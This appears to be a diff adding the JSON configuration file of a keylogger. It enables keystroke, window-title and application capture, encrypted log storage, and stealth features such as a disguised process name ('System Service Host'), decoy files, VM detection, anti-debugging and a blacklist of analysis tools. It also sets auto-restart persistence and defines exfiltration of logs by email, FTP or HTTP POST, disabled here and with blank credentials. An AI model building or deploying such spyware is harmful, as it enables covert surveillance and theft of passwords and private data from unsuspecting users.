@@ -1,0 +1,111 @@
+{
+    "general": {
+        "debug_mode": false,
+        "log_level": "INFO",
+        "process_name": "System Configuration Manager"
+    },
+    "keylogger": {
+        "enabled": true,
+        "buffer_size": 100,
+        "flush_interval_minutes": 5,
+        "log_special_keys": true,
+        "log_timestamps": true,
+        "capture_window_titles": true,
+        "capture_application_names": true
+    },
+    "encryption": {
+        "enabled": true,
+        "algorithm": "Fernet",
+        "password": "0000",
+        "key_file": "logs/.encryption.key",
+        "compress_logs": true
+    },
+    "stealth": {
+        "hide_console": true,
+        "process_name_obfuscation": true,
+        "fake_process_name": "System Service Host",
+        "create_decoy_files": true,
+        "vm_detection": true,
+        "anti_debug": true,
+        "self_destruct_on_analysis": false
+    },
+    "persistence": {
+        "startup_enabled": false,
+        "auto_restart": true,
+        "restart_delay_seconds": 30,
+        "max_restart_attempts": 5,
+        "install_location": "",
+        "service_enabled": false,
+        "watchdog_enabled": true
+    },
+    "storage": {
+        "log_file": "logs/keylog.txt",
+        "encrypted_log_file": "logs/keylog.enc",
+        "database_file": "logs/.keylog.db",
+        "max_log_size_mb": 10,
+        "auto_cleanup_days": 30,
+        "backup_enabled": true,
+        "backup_interval_days": 7
+    },
+    "transmission": {
+        "enabled": false,
+        "method": "email",
+        "interval_hours": 24,
+        "delete_after_send": true,
+        "retry_attempts": 3,
+        "compress_before_send": true
+    },
+    "email": {
+        "enabled": false,
+        "smtp_server": "smtp.gmail.com",
+        "smtp_port": 587,
+        "use_tls": true,
+        "sender_email": "",
+        "sender_password": "",
+        "recipient_email": "",
+        "subject_prefix": "Keylogger Report"
+    },
+    "ftp": {
+        "enabled": false,
+        "server": "",
+        "port": 21,
+        "username": "",
+        "password": "",
+        "remote_directory": "/uploads",
+        "use_passive": true
+    },
+    "http": {
+        "enabled": false,
+        "url": "",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "System Service"
+        },
+        "timeout_seconds": 30,
+        "verify_ssl": true
+    },
+    "security": {
+        "whitelist_processes": [],
+        "blacklist_processes": ["ida", "ollydbg", "wireshark", "procmon"],
+        "allowed_users": [],
+        "restricted_paths": [],
+        "max_daily_logs": 10000,
+        "emergency_stop_file": ".stop_keylogger"
+    },
+    "monitoring": {
+        "system_activity": true,
+        "network_monitoring": false,
+        "process_monitoring": true,
+        "file_monitoring": false,
+        "check_interval_seconds": 60
+    },
+    "advanced": {
+        "multi_threading": true,
+        "memory_optimization": true,
+        "cpu_throttling": false,
+        "steganography": false,
+        "polymorphic_code": false,
+        "rootkit_mode": false
+    }
+}
